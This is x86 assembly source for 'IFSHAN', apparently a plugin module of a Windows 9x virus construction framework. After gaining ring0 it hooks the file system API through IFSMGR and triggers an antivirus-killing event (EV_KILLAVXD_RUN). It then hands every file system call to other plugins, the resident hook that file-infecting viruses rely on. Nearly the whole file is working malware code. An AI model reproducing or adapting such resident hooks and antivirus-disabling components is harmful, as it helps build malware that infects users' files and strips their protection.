   ; IFSHAN  (IFS handler)
   ; ~~~~~~
   ; - when ring0 entered, hooks IFS
   ; - contains active IFS handler
   ; - performs IFS handler busy-check
   ; - on each IFS call, calls EV_TSR_ON_IFSCALL event (see IFSCALL plugin)

   include                 INCLUDE\consts.inc
   include                 system.inc
   include                 tsr.inc
   include                 killavxd.inc

   include                 plugin.inc
                           PLUGIN_START    IFSHAN, W9XR0, PERMUTABLE

   handleevent:            hookevent EV_TSR_IN_NEW_ADDR, hookit
                           stc
                           retn

                           ; get tempdata base into EAX
   get_data_base:          call    __pop_it

                           dd      ?
                           dd      ?
                           dd      ?
                           dd      ?

   _SAVEEBP                =       dword ptr 0  ; 0 1 2 3
   _OLDIFS                 =       dword ptr 4  ; 4 5 6 7
   _IFSBUSY                =       dword ptr 8  ; 8 9 10 11
   _COUNT                  =       dword ptr 12 ; 8 9 10 11

   __pop_it:               pop     eax
                           retn

   hookit:                 pusha

                           xor     ecx, ecx
                           call    get_data_base
                           mov     [eax]._SAVEEBP, ebp
                           mov     [eax]._OLDIFS,  ecx
                           mov     [eax]._IFSBUSY, ecx
                           mov     [eax]._COUNT,   ecx

                           call    get_hooker_ofs
                           VMMcall Call_When_Idle
   ;                       VMMcall Call_When_Not_Critical

                           popa
                           stc
                           retn

   get_hooker_ofs:         call    qwe
   qwe:                    pop     esi
                           add     esi, hooker-qwe
                           retn

   hooker:                 pusha

                           call    get_data_base
                           mov     ebp, [eax]._SAVEEBP

                           xor     ecx, ecx

                           call    get_data_base

                           ;;
                           cmp     [eax]._IFSBUSY, ecx
                           je      __zerocnt
                           inc     [eax]._COUNT
                           cmp     [eax]._COUNT, CLRBUSY_COUNT
                           jb      __skipclr
                           mov     [eax]._IFSBUSY, ecx
   __zerocnt:              mov     [eax]._COUNT, ecx
   __skipclr:              ;;

                           ;;
                           cmp     [eax]._OLDIFS, ecx
                           jne     __skipinst

                           event   EV_KILLAVXD_RUN

                           pusho   tsr_ifs_handler
                           pop     eax

                           push    eax
                           VxDcall IFSMGR, InstallFileSystemApiHook
                           pop     ecx
   ;                       push    909090C3h
   ;                       push    59004000h
   ;                       push    6720CD50h
   ;                       call    esp
   ;                       add     esp, 3*4

                           push    eax
                           call    get_data_base
                           pop     [eax]._OLDIFS
   __skipinst:             ;;

                           popa
                           stc
                           retn

   tsr_ifs_handler:        pusha

                           xor     ecx, ecx
                           call    get_data_base
                           cmp     [eax]._IFSBUSY, ecx
                           jne     __busy
                           inc     [eax]._IFSBUSY
                           mov     [eax]._COUNT, ecx

                           mov     ebp, [eax]._SAVEEBP

                           lea     esi, [esp+32]      ; ESI = @ifs_onstack_shit
                           event   EV_TSR_ON_IFSCALL

                           call    clearbusy

   __busy:                 popa

                           call    get_data_base
                           mov     eax, [eax]._OLDIFS
                           jmp     [eax] ; this is the only right way to return.
                                         ; never save *oldifs, but only oldifs.

   clearbusy:              call    get_data_base
                           mov     [eax]._IFSBUSY, 0
                           retn

                           PLUGIN_END
